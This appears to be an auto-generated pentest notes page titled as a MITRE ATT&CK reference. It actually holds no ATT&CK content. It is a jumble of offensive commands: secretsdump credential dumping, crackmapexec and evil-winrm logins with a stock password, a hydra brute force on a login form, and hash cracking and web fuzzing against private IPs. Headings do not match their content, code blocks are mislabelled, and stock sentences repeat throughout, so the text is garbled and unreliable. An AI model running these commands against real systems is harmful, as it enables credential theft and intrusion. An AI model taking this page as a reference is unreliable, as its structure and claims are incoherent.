---
TitleSEO: "MITRE ATT&CK Framework Reference | ZureFX"
TitlePost: "MITRE ATT&CK Framework Reference"
Author: "ZureFX"
Description: "Personal notes on MITRE ATT&CK Framework Reference. Quick reference for pentesting and CTF challenges."
Keywords: "lateral movement, linux, windows, enumeration, dfir"
URL: "https://zurefx.github.io/notes/note-mitre-att&ck-framework-reference-248.html"
URL_IMAGES: ""
Date: "2024-01-18"
Tags: "Lateral Movement, Linux, Windows, Enumeration, DFIR"
Section: "notes"
Lang: "en"
main_img: "note-mitre-att&ck-framework-reference-248"
Permalink: "/notes/note-mitre-att&ck-framework-reference-248.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Constrained Delegation

### LXD Privilege Escalation

The database credentials were hardcoded in the application source code. Unconstrained delegation was enabled on the compromised machine. Authentication bypass was achieved through careful manipulation of the login mechanism. Network traffic analysis revealed unencrypted communications containing user credentials. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.26.22.42
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.117.50.163/FUZZ
```

- `hydra`
- `Weak Service Permissions`
- `Unconstrained Delegation`

```powershell
nmap -sCV -p3268,8888,587 10.94.109.8 -oN scan.txt
crackmapexec smb 10.94.76.2 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.101.44.159 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.31.195.58/FUZZ
```

## WinRM

### secretsdump

The backup files contained sensitive information that should not have been accessible. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p464,464,21 10.48.154.126 -oN scan.txt
```

The service account had excessive permissions assigned in Active Directory. Post-exploitation enumeration revealed a path to domain administrator privileges.

Network traffic analysis revealed unencrypted communications containing user credentials. Token impersonation allowed elevation to SYSTEM privileges on the target. The kernel version was outdated and vulnerable to a publicly known exploit. Authentication bypass was achieved through careful manipulation of the login mechanism. The target system was identified as running a vulnerable version of the service.

Post-exploitation enumeration revealed a path to domain administrator privileges. The web application was vulnerable to Server-Side Template Injection (SSTI). Weak file permissions allowed modification of critical system files. Lateral movement was facilitated by reusing discovered credentials across services. The service account had excessive permissions assigned in Active Directory.

## Kali Linux

### dcomexec

The web application was vulnerable to Server-Side Template Injection (SSTI). Token impersonation allowed elevation to SYSTEM privileges on the target. The service account had excessive permissions assigned in Active Directory.

```bash
crackmapexec smb 10.58.160.252 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.64.214.200
```

```bash
evil-winrm -i 10.55.202.86 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.16.61.58 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Group Policy Preferences contained encrypted but recoverable credentials. The scheduled task ran with elevated privileges and could be abused for escalation. Post-exploitation enumeration revealed a path to domain administrator privileges. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Telnet

### gobuster

Network traffic analysis revealed unencrypted communications containing user credentials. Lateral movement was facilitated by reusing discovered credentials across services. The kernel version was outdated and vulnerable to a publicly known exploit. The application stored sensitive credentials in an unencrypted configuration file. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.13.177.249 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.17.239.128/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.23.90.55/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.101.173.76/FUZZ
```

Initial enumeration revealed several interesting open ports on the target. Privilege escalation was possible due to misconfigured sudo permissions. The web application was vulnerable to Server-Side Template Injection (SSTI). Token impersonation allowed elevation to SYSTEM privileges on the target.

## Django

### Kerberos

Post-exploitation enumeration revealed a path to domain administrator privileges. Authentication bypass was achieved through careful manipulation of the login mechanism.

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.40.75.220/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Privilege escalation was possible due to misconfigured sudo permissions. Authentication bypass was achieved through careful manipulation of the login mechanism. Post-exploitation enumeration revealed a path to domain administrator privileges.
